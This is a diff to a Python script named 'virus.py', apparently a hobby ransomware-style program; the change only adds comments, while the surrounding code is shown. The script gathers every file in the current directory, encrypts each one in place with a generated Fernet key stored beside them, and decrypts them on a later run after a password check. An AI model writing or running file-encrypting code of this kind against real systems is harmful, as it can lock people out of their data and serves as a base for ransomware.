@@ -2,8 +2,11 @@ import os
 from sys import exit
 from cryptography.fernet import Fernet
 
+# Getting all the files in the directory
 files = [f for f in os.listdir() if (f != "virus.py" and f != "Secrets.key" and os.path.isfile(f))]
 
+
+#Deciding if it needs to encrypt or decrypt the files
 encrypted = os.path.exists("./Secrets.key")
 if(not encrypted):
     secret = Fernet.generate_key()
@@ -21,11 +24,11 @@ else:
         with open("Secrets.key", "rb") as key:
             secret = key.read()
         key.close()
-        
     else:
         print("Wrong password.")
         exit()
 
+#Encryption/decryption process
 for f in files:
     with open(f, "rb") as file:
         content = file.read()
@@ -40,6 +43,7 @@ for f in files:
         file.write(contentModified)
     file.close()
 
+#Validating and removing the key directory, if it's not encrypted anymore
 encrypted = not encrypted
 
 if(not encrypted):
